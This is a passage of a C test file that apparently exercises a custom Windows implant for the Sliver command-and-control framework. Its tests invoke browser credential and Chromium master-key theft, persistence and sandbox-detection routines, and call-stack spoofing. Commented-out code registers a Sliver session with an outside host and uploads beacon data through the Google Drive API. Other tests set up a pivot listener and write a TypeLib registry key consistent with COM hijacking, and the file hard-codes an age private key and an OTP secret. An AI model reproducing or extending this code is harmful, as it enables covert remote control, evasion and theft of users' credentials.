	wsprintfA(szTimeZone, "%03d", TimeZone.Bias / (-60));
	PrintFormatA("%s\n", szTimeZone);
}

void test91(void) {
	WCHAR lpPath[] = L"C:\\Users\\Admin\\Downloads\\Firefox Installer.exe";
	UINT64 uModifiedTime = 0;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	UINT64 uResult = 0;
	FILETIME LastWriteTime;

	hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		LOG_ERROR("CreateFileW", GetLastError());
		return;
	}

	SecureZeroMemory(&LastWriteTime, sizeof(LastWriteTime));
	if (!GetFileTime(hFile, NULL, NULL, &LastWriteTime)) {
		LOG_ERROR("GetFileTime", GetLastError());
		return;
	}

	//uModifiedTime = GetModifiedTime(lpPath);
	uModifiedTime = FILETIME_TO_UNIXTIME(LastWriteTime);
	PrintFormatW(L"%lu\n", (DWORD)uModifiedTime);
}

void test92(void) {
	BYTE Buffer[] = { 73, 110, 116, 101, 108, 194, 174, 32, 83, 109, 97, 114, 116 };
	WCHAR wszOutput[0x100];

	MultiByteToWideChar(CP_UTF8, 0, Buffer, _countof(Buffer), wszOutput, _countof(wszOutput));
	//HexDump(wszOutput, sizeof(wszOutput));
	PrintFormatW(L"%d: wszOutput: %s\n", wszOutput);
}

void test93(void) {
	BYTE Buffer[] = { 10, 21, 10, 8, 65, 120, 73, 110, 115, 116, 83, 86, 18, 9, 108, 111, 99, 97, 108, 104, 111, 115, 116, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 99, 49, 97, 52, 97, 52, 53, 100, 45, 101, 102, 51, 54, 45, 52, 51, 97, 54, 45, 57, 52, 55, 100, 45, 55, 102, 57, 97, 50, 55, 98, 56, 102, 49, 50, 56 };
	ENVELOPE Envelope;

	Envelope.pData = ALLOC(sizeof(BUFFER));
	Envelope.pData->pBuffer = Buffer;
	Envelope.pData->cbBuffer = sizeof(Buffer);
	ServiceDetailHandler(&Envelope);
}

void test94(void) {
	CHAR szMessage[] = "Hello World";
	PENVELOPE pRespEnvelope = CreateErrorRespEnvelope(szMessage, 9, 0);

	HexDump(pRespEnvelope->pData->pBuffer, pRespEnvelope->pData->cbBuffer);
}

void test95(void) {
	BYTE szBuffer[] = { 10, 41, 67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101, 109, 51, 50, 92, 105, 99, 97, 99, 108, 115, 46, 101, 120, 101, 32, 67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 24, 1, 34, 26, 67, 58, 85, 115, 101, 114, 115, 65, 100, 109, 105, 110, 68, 101, 115, 107, 116, 111, 112, 108, 111, 103, 46, 116, 120, 116, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 101, 99, 100, 99, 100, 54, 98, 56, 45, 97, 52, 56, 54, 45, 52, 99, 99, 56, 45, 98, 57, 99, 52, 45, 50, 57, 97, 101, 98, 55, 97, 100, 99, 51, 53, 101 };
	ENVELOPE Envelope;
	PENVELOPE pRespEnvelope = NULL;

	SecureZeroMemory(&Envelope, sizeof(Envelope));
	Envelope.pData = ALLOC(sizeof(BUFFER));
	Envelope.pData->pBuffer = szBuffer;
	Envelope.pData->cbBuffer = sizeof(szBuffer);
	pRespEnvelope = ExecuteHandler(&Envelope);
	HexDump(pRespEnvelope->pData->pBuffer, pRespEnvelope->pData->cbBuffer);
	FreeEnvelope(pRespEnvelope);
}

void test96(void) {
	DeletePath(L"C:\\Users\\Admin\\Desktop\\Hello\\");
}

void test97(void) {
	//UnzipBuffer("C:\\Users\\Admin\\Desktop\\Hello.7z");
}

void test98(void) {
	Unzip(L"C:\\Users\\Admin\\Desktop\\Test.zip", L"C:\\Users\\Admin");
}

void test99(void) {
	if (IsFolderExist(L"..\\Removerr")) {
		PrintFormatW(L"Folder exist\n");
	}
	else {
		PrintFormatW(L"%d: Folder is not exist\n");
	}
}

void test100(void) {
	CompressPathByGzip(L"..\\..\\Desktop\\Folder", NULL);
}

void test101(void) {
	/*PSLIVER_HTTP_CLIENT pSliverClient = NULL;
	PBYTE pMarshaledRegisterInfo = NULL;
	DWORD cbMarshaledRegisterInfo = 0;
	PENVELOPE pRegisterEnvelope = NULL;

	pSliverClient = SliverSessionInit("http://ubuntu-icefrog2000.com");
	if (pSliverClient == NULL) {
		LogError(L"%s.%d: SliverSessionInit failed at %s\n", __FILE__, __LINE__, __FUNCTIONW__);
		goto CLEANUP;
	}

	PrintFormatA("pSliverClient->szSessionID: %s\n", pSliverClient->szSessionID);
	pSliverClient->HttpConfig.AdditionalHeaders[Cookie] = ALLOC(lstrlenA(pSliverClient->szSessionID) + lstrlenA(pSliverClient->lpCookiePrefix) + 1);
	wsprintfA(pSliverClient->HttpConfig.AdditionalHeaders[Cookie], "%s=%s", pSliverClient->lpCookiePrefix, pSliverClient->szSessionID);
	pMarshaledRegisterInfo = RegisterSliver(pSliverClient, &cbMarshaledRegisterInfo);
	if (pMarshaledRegisterInfo == NULL) {
		LogError(L"%s.%d: RegisterSliver failed at %s", __FILE__, __LINE__, __FUNCTIONW__);
		goto CLEANUP;
	}

	pRegisterEnvelope = ALLOC(sizeof(ENVELOPE));
	pRegisterEnvelope->uType = MsgRegister;
	pRegisterEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRegisterEnvelope->pData->pBuffer = pMarshaledRegisterInfo;
	pRegisterEnvelope->pData->cbBuffer = cbMarshaledRegisterInfo;
	WriteEnvelope(pSliverClient, pRegisterEnvelope);
	SessionMainLoop(pSliverClient);
CLEANUP:
	FreeEnvelope(pRegisterEnvelope);
	FreeSliverHttpClient(pSliverClient);
	return;*/
}

void test102(void) {
	PrintFormatW(L"Hello %d 0x%08x\n\n\n", 1, 2);
}

void test103(void) {
	WCHAR wszHello[] = L"Hello";
	LPWSTR lpPointer = NULL;

	DWORD dwIdx = TlsAlloc();
	PrintFormatW(L"Idx: 0x%08x\n", dwIdx);
	TlsSetValue(dwIdx, wszHello);
	lpPointer = (LPWSTR)TlsGetValue(dwIdx);
	PrintFormatW(L"Value: %s\n", lpPointer);
}

void test104(void) {
	DWORD dwThreadId = 0;
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)test103, NULL, 0, &dwThreadId);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}

void test105(void) {
	RPC_STATUS Status = RPC_S_OK;
	UUID pUuid;
	WCHAR wszUuid[0x100];
	LPWSTR lpResult = NULL;

	Status = UuidCreateSequential(&pUuid);
	StringFromGUID2(&pUuid, wszUuid, _countof(wszUuid));
	lpResult = ALLOC(lstrlenW(wszUuid) * sizeof(WCHAR));
	lstrcpyW(lpResult, wszUuid + 1);
	lpResult[lstrlenW(lpResult) - 1] = L'\0';
	lpResult[14] = L'4';
	lpResult[19] = L'8';
	PrintFormatW(L"%s\n", lpResult);
}

void test106(void) {
	HANDLE hKernel32 = NULL;
	HANDLE hImage = NULL;
	LPVOID lpBaseThreadInitThunk = NULL;
	DWORD cbBaseThreadInitThunk = 0;
	PIMAGE_DOS_HEADER pDosHdr = NULL;
	PIMAGE_NT_HEADERS64 pNtHdr = NULL;
	PIMAGE_OPTIONAL_HEADER64 pOptionalHdr = NULL;
	DWORD dwExceptionDirRva = 0;
	DWORD cbExceptionDir = 0;
	PRUNTIME_FUNCTION pRuntimeFunc = NULL;
	LPVOID lpStartFunc = NULL;
	DWORD i = 0;
	PUINT64 pStackAddr = NULL;
	MEMORY_BASIC_INFORMATION64 MemInfo;
	UINT64 uStackValue = 0;

	hKernel32 = GetModuleHandleA("kernel32.dll");
	if (hKernel32 == NULL) {
		goto CLEANUP;
	}

	lpBaseThreadInitThunk = GetProcAddress(hKernel32, "BaseThreadInitThunk");
	hImage = GetModuleHandleA(NULL);
	pDosHdr = (PIMAGE_DOS_HEADER)hKernel32;
	pNtHdr = (PIMAGE_NT_HEADERS64)((ULONG_PTR)pDosHdr + pDosHdr->e_lfanew);
	pOptionalHdr = (PIMAGE_FILE_HEADER)&pNtHdr->OptionalHeader;
	dwExceptionDirRva = pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
	cbExceptionDir = pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
	for (i = 0; i < cbExceptionDir; i += sizeof(RUNTIME_FUNCTION)) {
		pRuntimeFunc = (PRUNTIME_FUNCTION)((ULONG_PTR)hKernel32 + dwExceptionDirRva + i);
		lpStartFunc = (LPVOID)((ULONG_PTR)hKernel32 + pRuntimeFunc->BeginAddress);
		if (lpStartFunc == lpBaseThreadInitThunk) {
			cbBaseThreadInitThunk = pRuntimeFunc->EndAddress - pRuntimeFunc->BeginAddress;
			break;
		}
	}

	pStackAddr = (PUINT64)_AddressOfReturnAddress();
	SecureZeroMemory(&MemInfo, sizeof(MemInfo));
	if (VirtualQuery((LPVOID)pStackAddr, &MemInfo, sizeof(MemInfo)) == 0) {
		goto CLEANUP;
	}

	for (i = 0; i < MemInfo.BaseAddress + MemInfo.RegionSize; i += sizeof(UINT64)) {
		uStackValue = *(PUINT64)((ULONG_PTR)pStackAddr + i);
		if (uStackValue > (UINT64)lpBaseThreadInitThunk && uStackValue < (UINT64)lpBaseThreadInitThunk + cbBaseThreadInitThunk) {
			*(PUINT64)((ULONG_PTR)pStackAddr + i) = 0;
			break;
		}
	}

CLEANUP:
	return;
}

void test107(void) {
	PrintFormatW(L"Hello World");
}

int test108(void) {
	int a = 1;
	int b = 1;
	test107();
	return a + b;
}

void test109(void) {
	//StackSpoofing(PrintFormatA, 5, "Hello %s, ID: %d, address: %p, hex value: 0x%08x", "Dat", 10, test109, 20);
}

void test110(void) {
	HINTERNET hHttpSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;
	WINHTTP_AUTOPROXY_OPTIONS AutoProxyOptions;
	WINHTTP_PROXY_INFO ProxyInfo;
	PDWORD pProxyEnable = NULL;
	DWORD cbOutput = 0;
	LPSTR lpProxyServer = NULL;
	BOOL ProxyEnable = FALSE;

	hHttpSession = WinHttpOpen(L"WinHTTP AutoProxy Sample/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hHttpSession) {
		return;
	}

	hConnect = WinHttpConnect(hHttpSession, L"www.microsoft.com", INTERNET_DEFAULT_HTTP_PORT, 0);
	if (!hConnect) {
		return;
	}

	hRequest = WinHttpOpenRequest(hConnect, L"GET", L"ms.htm", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	if (!hRequest) {
		return;
	}

	SecureZeroMemory(&AutoProxyOptions, sizeof(AutoProxyOptions));
	AutoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
	AutoProxyOptions.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
	AutoProxyOptions.fAutoLogonIfChallenged = TRUE;

	SecureZeroMemory(&ProxyInfo, sizeof(ProxyInfo));
	if (WinHttpGetProxyForUrl(hHttpSession, L"https://www.microsoft.com/ms.htm", &AutoProxyOptions, &ProxyInfo)) {
		ProxyEnable = TRUE;
	}
	else {
		if (QueryRegValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", L"ProxyEnable", &pProxyEnable, &cbOutput)) {
			if (*pProxyEnable == 1) {
				if (QueryRegValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", L"ProxyEnable", &lpProxyServer, &cbOutput)) {
					SecureZeroMemory(&ProxyInfo, sizeof(ProxyInfo));
					ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
					ProxyInfo.lpszProxy = ConvertCharToWchar(lpProxyServer);
					ProxyEnable = TRUE;
				}
			}
		}
	}

	if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof(ProxyInfo))) {
		return;
	}

	if (pProxyEnable != NULL) {
		FREE(pProxyEnable);
	}

	if (lpProxyServer != NULL) {
		FREE(lpProxyServer);
	}

	if (AutoProxyOptions.lpszAutoConfigUrl != NULL) {
		FREE(AutoProxyOptions.lpszAutoConfigUrl);
	}
}

void test111(void)
{
	HINTERNET hHttpSession = NULL;
	PWINHTTP_PROXY_INFO pProxyInfo = NULL;

	hHttpSession = WinHttpOpen(L"WinHTTP AutoProxy Sample/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hHttpSession) {
		return;
	}

	pProxyInfo = ResolveProxy(hHttpSession, L"www.microsoft.com");
CLEANUP:
	if (pProxyInfo != NULL) {
		FREE(pProxyInfo);
	}
}

void test112(void) {
	CHAR szSecret[] = "GQH4RBUBSOLX446N2CBCS7AYHYLBMA2A";
	POTP_DATA pOtpData = NULL;
	UINT64 uResult = 0;

	pOtpData = OtpInit(30, 1, 8, szSecret);
	uResult = GetOtpNow(pOtpData);
	PrintFormatA("%d\n", uResult);
	if (pOtpData != NULL) {
		if (pOtpData->lpBase32Secret != NULL) {
			FREE(pOtpData->lpBase32Secret);
		}

		FREE(pOtpData);
	}
}

void test113(void) {
	CHAR Buffer[100];
	wsprintfA(Buffer, "%IX", (UINT64)test113);
	PrintFormatA("%s\n", Buffer);
}

void test114(void) {
	LPWSTR lpFullPath = NULL;

	lpFullPath = GetFullPathW(L"E:\\asdf\\..");
	PrintFormatW(L"%s\n", lpFullPath);
}

void test115(void) {
	/*PBUFFER pMarshaledEnvelope = NULL;
	DWORD i = 0;
	CHAR szName[] = "Demo.txt";
	PDRIVE_CONFIG pDriveConfig = NULL;
	CHAR szSessionIdPrefix[33];
	BOOL Result = FALSE;
	CHAR szMetadata[0x400];
	LPSTR lpBody = NULL;
	DWORD cbBody = 0;
	LPSTR lpUniqueBoundary = NULL;
	BOOL NoHeapMemory = FALSE;
	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";
	PURI pUri = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pResp = NULL;
	PSLIVER_DRIVE_CLIENT pDriveClient = NULL;

	pMarshaledEnvelope = ALLOC(sizeof(BUFFER));
	pMarshaledEnvelope->pBuffer = DuplicateStrA("Hello from beacon", 0);
	pMarshaledEnvelope->cbBuffer = lstrlenA(pMarshaledEnvelope->pBuffer);
	pUri = UriInit(szUrl);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	lpBody = ALLOC(pMarshaledEnvelope->cbBuffer + 0x400);
	if (lpBody == NULL) {
		NoHeapMemory = TRUE;
		lpBody = VirtualAlloc(NULL, pMarshaledEnvelope->cbBuffer + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (lpBody == NULL) {
			LOG_ERROR("VirtualAlloc", GetLastError());
			goto CLEANUP;
		}
	}

	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szName);
	lpUniqueBoundary = GenRandomStr(16);
	cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, szName);
	memcpy(&lpBody[cbBody], pMarshaledEnvelope->pBuffer, pMarshaledEnvelope->cbBuffer);
	cbBody += pMarshaledEnvelope->cbBuffer;
	cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);

	pDriveClient = DriveInit();
	pDriveConfig = pDriveClient->DriveList[0];
	if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
	if (pResp->dwStatusCode != HTTP_STATUS_OK) {
		FreeHttpResp(pResp);
		goto CLEANUP;
	}

	FreeHttpResp(pResp);
	Result = TRUE;
CLEANUP:
	FreeHttpClient(pHttpClient);
	if (lpUniqueBoundary != NULL) {
		FREE(lpUniqueBoundary);
	}

	if (lpBody != NULL) {
		if (NoHeapMemory) {
			VirtualFree(lpBody, 0, MEM_RELEASE);
		}
		else {
			FREE(lpBody);
		}
	}

	FreeDriveClient(pDriveClient);
	FreeBuffer(pMarshaledEnvelope);
	return Result;*/
}

void test116(void) {
	DWORD dwNumberOfUserDatas = 0;
	PUSER_DATA* pResult = NULL;
	DWORD i = 0;

	pResult = PickChromium(&dwNumberOfUserDatas);
	for (i = 0; i < dwNumberOfUserDatas; i++) {
		FreeUserData(pResult[i]);
	}

	FREE(pResult);
}

void test117(void) {
	DWORD dwNumberOfUserDatas = 0;
	PUSER_DATA* pResult = NULL;
	DWORD i = 0;

	pResult = PickBrowsers(&dwNumberOfUserDatas);
	for (i = 0; i < dwNumberOfUserDatas; i++) {
		FreeUserData(pResult[i]);
	}

	FREE(pResult);
}

void test118(void) {
	USER_DATA UserData;

	SecureZeroMemory(&UserData, sizeof(UserData));
	UserData.lpKeyPath = DuplicateStrW(L"C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", 0);
	GetChromiumMasterKey(&UserData);
}

void test119(void) {
	LPSTR lpResult = Base64Encode("Hello World", lstrlenA("Hello World"), FALSE);
	PrintFormatA("%s\n", lpResult);
}

void test120(void) {
	BYTE Buffer[] = { 97 ,103 ,101 ,49 ,51 ,110 ,121 ,108 ,56 ,116 ,117 ,101 ,103 ,99 ,99 ,119 ,112 ,50 ,101 ,56 ,52 ,112 ,114 ,112 ,120 ,116 ,99 ,100 ,116 ,55 ,109 ,99 ,50 ,109 ,52 ,107 ,52 ,53 ,57 ,104 ,114 ,54 ,50 ,51 ,118 ,102 ,116 ,48 ,101 ,115 ,55 ,107 ,100 ,51 ,118 ,115 ,122 ,104 ,114 ,118 ,107 ,117 };
	BUFFER Message;
	Message.pBuffer = Buffer;
	Message.cbBuffer = sizeof(Buffer);
	CHAR szSignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+WHpHstchyjZDtG8gsraZpGTaEGz7MvUQ8aas1Cnl1nbLv2a8jMLEbnKh4TEbYJaKuZAxlxLn4Jbdb1+T9Uf+g0=\ntrusted comment: timestamp:1729873121\nLZxs9NlszjyShQgFLxWrziZ7JzDMpgIBfPSOOkboexF8Eursc4SDtVlC1x5r9yTMqS67SHyJbl35/x6LJ3PRCw==";
	CHAR szMinisignServerPublicKey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";

	BOOL Result = MinisignVerify(&Message, szSignature, szMinisignServerPublicKey);
	PrintFormatA("Result: %d\n", Result);
}

void test121(void) {
	CHAR szRecipientPrivateKey[] = "AGE-SECRET-KEY-1H0HPRPWCF67PPNU3WS0SLXJZPYVPRCXERN3QV93JR2M84S82UC4QM24RFG";
	CHAR Ciphertext[] = { 97, 83, 51, 98, 50, 49, 99, 121, 110, 101, 78, 73, 89, 83, 53, 107, 101, 54, 90, 90, 76, 112, 72, 72, 67, 99, 77, 115, 50, 105, 116, 66, 73, 51, 122, 53, 107, 85, 122, 97, 104, 105, 107, 10, 90, 50, 97, 110, 65, 97, 69, 116, 111, 66, 106, 85, 103, 73, 71, 82, 101, 84, 89, 75, 97, 52, 99, 53, 81, 55, 90, 110, 107, 85, 48, 101, 73, 76, 70, 97, 79, 88, 89, 113, 75, 53, 69, 10, 45, 45, 45, 32, 109, 81, 114, 69, 108, 48, 113, 65, 55, 110, 117, 68, 113, 77, 108, 114, 105, 99, 97, 110, 57, 85, 48, 119, 102, 77, 68, 73, 84, 55, 55, 54, 48, 55, 57, 70, 117, 99, 53, 90, 48, 69, 81, 10, 80, 101, 245, 237, 116, 200, 23, 99, 156, 85, 35, 10, 161, 253, 221, 108, 193, 31, 234, 48, 171, 31, 168, 224, 135, 218, 61, 255, 22, 250, 96, 144, 175, 149, 68, 232, 128, 124, 53, 219, 158, 226, 175, 220, 152, 53, 112, 248, 19, 66, 6, 136, 157, 176, 66, 141, 107, 234, 128, 223, 169, 39, 249, 188 };
	BUFFER Buffer;
	PBUFFER pResult = NULL;

	Buffer.pBuffer = &Ciphertext;
	Buffer.cbBuffer = _countof(Ciphertext);
	pResult = AgeDecrypt(szRecipientPrivateKey, &Buffer);
	PrintFormatA("pResult:\n");
	HexDump(pResult->pBuffer, pResult->cbBuffer);
	FreeBuffer(pResult);
}

void test122(void) {
	/*PSTANZA_WRAPPER pStanzaList = NULL;
	CHAR Ciphertext[] = { 78, 106, 116, 98, 81, 47, 49, 81, 109, 115, 86, 54, 52, 101, 83, 113, 69, 105, 98, 50, 97, 121, 75, 101, 119, 77, 47, 106, 71, 68, 80, 52, 90, 88, 90, 71, 116, 50, 73, 55, 103, 86, 65, 10, 67, 86, 88, 53, 118, 108, 75, 114, 89, 80, 103, 112, 101, 55, 107, 43, 116, 113, 72, 56, 109, 119, 82, 104, 81, 113, 49, 100, 111, 87, 114, 118, 116, 66, 78, 79, 116, 86, 106, 89, 114, 79, 48, 10, 45, 45, 45, 32, 83, 85, 76, 108, 71, 56, 56, 117, 76, 80, 53, 99, 121, 118, 111, 81, 51, 56, 84, 87, 81, 68, 90, 109, 74, 106, 110, 57, 78, 109, 75, 118, 68, 75, 66, 66, 88, 112, 65, 87, 54, 116, 56, 10, 151, 161, 50, 125, 201, 131, 78, 23, 140, 226, 117, 173, 59, 185, 54, 143, 150, 37, 236, 185, 69, 233, 11, 0, 94, 109, 107, 160, 8, 175, 140, 30, 108, 130, 158, 60, 212, 52, 23, 60, 23, 86, 114, 235, 96, 227, 115, 254, 238, 169, 73, 152, 0, 76, 205, 60, 28, 60, 58, 133, 72, 110, 84, 89 };
	BYTE FileKey[] = { 224, 18, 103, 86, 180, 209, 104, 26, 46, 70, 147, 76, 165, 234, 170, 44 };
	CHAR szAgeMsgPrefix[] = "age-encryption.org/v1\n-> X25519 ";
	DWORD cbTempBuffer = 0;
	PBUFFER pCipherText = NULL;
	PBYTE pTempBuffer = NULL;
	PBYTE pMac = NULL;

	pCipherText = ALLOC(sizeof(BUFFER));
	pCipherText->pBuffer = Ciphertext;
	pCipherText->cbBuffer = sizeof(Ciphertext);

	cbTempBuffer = lstrlenA(szAgeMsgPrefix) + pCipherText->cbBuffer;
	pTempBuffer = ALLOC(cbTempBuffer);
	lstrcpyA(pTempBuffer, szAgeMsgPrefix);
	memcpy(pTempBuffer + lstrlenA(szAgeMsgPrefix), pCipherText->pBuffer, pCipherText->cbBuffer);
	pStanzaList = ParseStanza(pTempBuffer);

	pMac = HeaderMAC(pStanzaList, FileKey, sizeof(FileKey));
	HexDump(pMac, SHA256_HASH_SIZE);
	pCipherText->pBuffer = NULL;
	FreeBuffer(pCipherText);
	FREE(pTempBuffer);
	FREE(pMac);*/
}

void test123
(
	_In_ SOCKET Sock
)
{
	ULONG IoBlock = 1;

	/*while (TRUE) {
		if (IoBlock == 1) {
			IoBlock = 0;
		}
		else {
			IoBlock = 1;
		}

		PrintFormatA("ioctlsocket(%d)\n", IoBlock);
		

		Sleep(10000);
	}*/

	Sleep(7000);
	if (ioctlsocket(Sock, FIONBIO, &IoBlock) != NO_ERROR) {
		LOG_ERROR("ioctlsocket", WSAGetLastError());
		return;
	}

	PrintFormatA("ioctlsocket(%d)\n", IoBlock);
}

void test124(void)
{
	PPIVOT_LISTENER pListener = NULL;
	IN_ADDR InAddr;
	NTSTATUS Status = STATUS_SUCCESS;
	SOCKADDR_IN SockAddr;
	USHORT uPort = 0;
	SOCKET NewSock = INVALID_SOCKET;
	SOCKET Sock = INVALID_SOCKET;
	ULONG IoBlock = 0;
	DWORD dwErrorCode = 0;
	BOOL IsOk = FALSE;
	WSADATA WsaData;

	SecureZeroMemory(&WsaData, sizeof(WsaData));
	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
		goto CLEANUP;
	}

	SecureZeroMemory(&InAddr, sizeof(InAddr));
	SecureZeroMemory(&SockAddr, sizeof(SockAddr));
	Status = RtlIpv4StringToAddressExA("127.0.0.1:9898", TRUE, &InAddr, &uPort);
	if (Status != STATUS_SUCCESS) {
		goto CLEANUP;
	}

	SockAddr.sin_addr.s_addr = InAddr.S_un.S_addr;
	SockAddr.sin_port = uPort;
	SockAddr.sin_family = AF_INET;
	Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (Sock == INVALID_SOCKET) {
		LOG_ERROR("socket", WSAGetLastError());
		goto CLEANUP;
	}

	if (ioctlsocket(Sock, FIONBIO, &IoBlock) != NO_ERROR) {
		LOG_ERROR("ioctlsocket", WSAGetLastError());
		goto CLEANUP;
	}

	if (bind(Sock, &SockAddr, sizeof(SockAddr)) != NO_ERROR) {
		LOG_ERROR("bind", WSAGetLastError());
		goto CLEANUP;
	}

	if (listen(Sock, SOMAXCONN) != NO_ERROR) {
		LOG_ERROR("listen", WSAGetLastError());
		goto CLEANUP;
	}

	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)test123, (LPVOID)Sock, 0, NULL);
	while (TRUE) {
		NewSock = accept(Sock, NULL, NULL);
		PrintFormatA("NewSock is created\n");
		Sleep(5000);
	}
CLEANUP:
	return;
}

void test125(void) {
	//PersistenceMethod2("C:\\Windows\\System32\\cmd.exe");
}

void test126(void) {
	DetectSandbox1();
}

void test127(void) {
	//PersistenceMethod1("C:\\Windows\\System32\\cmd.exe");
}

void test128(void) {
	/*GLOBAL_CONFIG Config;

	SecureZeroMemory(&Config, sizeof(Config));
	Config.lpSliverPath = DuplicateStrW(L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech", 0);
	Config.lpPeerPrivKey = DuplicateStrA("1", 0);
	Persistence(&Config);*/
}

VOID Callback129
(
	_In_ BSTR lpInput,
	_In_ LPVOID Arg
)
{
	WriteToFile(L"C:\\Users\\Admin\\Desktop\\log.txt", "1", 1);
}

void test129(void) {
	RegisterAsyncEvent(L"SELECT * FROM Win32_ComputerShutdownEvent", Callback129, NULL);
}

void test130(void) {
	HANDLE hTransaction = INVALID_HANDLE_VALUE;
	HKEY hKey = NULL;
	HKEY hTypeLibHkey = NULL;
	LSTATUS Status = STATUS_SUCCESS;

	hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
	if (hTransaction == INVALID_HANDLE_VALUE) {
		LOG_ERROR("CreateTransaction", GetLastError());
		goto CLEANUP;
	}
	
	Status = RegOpenKeyTransactedA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\TypeLib", 0, KEY_WRITE, &hKey, hTransaction, NULL);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegCreateKeyTransactedA", Status);
		goto CLEANUP;
	}

	Status = RegCreateKeyExA(hKey, "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}\\1.1\\0", 0, NULL, 0, KEY_WRITE, NULL, &hTypeLibHkey, NULL);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegCreateKeyExA", Status);
		goto CLEANUP;
	}

	if (!CommitTransaction(hTransaction)) {
		LOG_ERROR("CommitTransaction", GetLastError());
		goto CLEANUP;
	}

CLEANUP:
	if (hTransaction != INVALID_HANDLE_VALUE) {
		CloseHandle(hTransaction);
	}

}

void test131(void) {
	LPITEMIDLIST IdList = NULL;
	HRESULT hResult = S_OK;

	CoInitialize(NULL);
	hResult = SHParseDisplayName(L"C:\\Users\\Admin\\Desktop", NULL, &IdList, 0, NULL);
	if (hResult != S_OK) {
		LOG_ERROR("SHParseDisplayName", hResult);
		return;
	}

	hResult = SHOpenFolderAndSelectItems(IdList, 0, NULL, 0);
	LOG_ERROR("SHOpenFolderAndSelectItems", hResult);
	if (hResult != S_OK) {
		return;
	}
	
	HexDump(IdList->mkid.abID, IdList->mkid.cb);
	PrintFormatA("Is ok\n");
	CoUninitialize();
}

BOOL AddReference
(
	_In_ LPWSTR lpOutputName,
	_In_ LPWSTR lpInterfaceName,
	_In_ REFGUID TypeLibGUID,
	_In_ REFGUID IID,
	_In_ ITypeLib* RefTypelib,
	_In_ REFGUID RefIID
)
{
	ICreateTypeLib2* TypeLib2 = NULL;
	ICreateTypeInfo* CreateTypeInfo = NULL;
	HREFTYPE RefType = 0;
	ITypeInfo* RefTypeInfo = NULL;
	HRESULT hResult = S_OK;
	BOOL Result = FALSE;

	hResult = RefTypelib->lpVtbl->GetTypeInfoOfGuid(RefTypelib, RefIID, &RefTypeInfo);
	if (FAILED(hResult)) {
		LOG_ERROR("RefTypelib->GetTypeInfoOfGuid", hResult);
		goto CLEANUP;
	}

	hResult = CreateTypeLib2(SYS_WIN32, lpOutputName, &TypeLib2);
	if (FAILED(hResult)) {
		LOG_ERROR("CreateTypeLib2", hResult);
		goto CLEANUP;
	}

